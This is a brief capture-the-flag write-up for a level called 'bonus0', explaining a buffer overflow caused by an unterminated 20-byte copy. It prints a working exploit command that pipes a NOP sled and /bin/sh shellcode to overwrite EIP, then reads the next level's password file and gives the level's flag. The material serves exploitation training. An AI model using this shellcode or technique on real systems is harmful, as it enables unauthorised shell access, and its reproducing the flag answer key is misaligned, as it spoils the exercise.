# Bonus 0

This time the executable takes 2 inputs and copies the first 20 characters in a 20 character array. It replace the terminating newline character by a null byte but it still copies only the 20 first bytes so if there is no \n in the first 20 characters it will not put one in the final buffer. We will use a NOP slope to place our shellcode somewhere in the memory far enough to not be overwritten by the second input and so we do not need to pinpoint the exact address of the shellcode which will make it easier to not have any \x00 in the final address. Then we want to overflow in EIP pointer and put any address within the NOP slope before the shellcode (it needs to be far enough to be in the part that is not affected by the second input).

```bash
(python -c 'print "\x90" * 128 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\x31\xd2\xcd\x80"'; python -c 'print " " * 9 + "\xf0\xe6\xff\xbf" + "N" * 42'; cat) | ./bonus0
cat /home/user/bonus1/.pass
```

**Flag:** `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
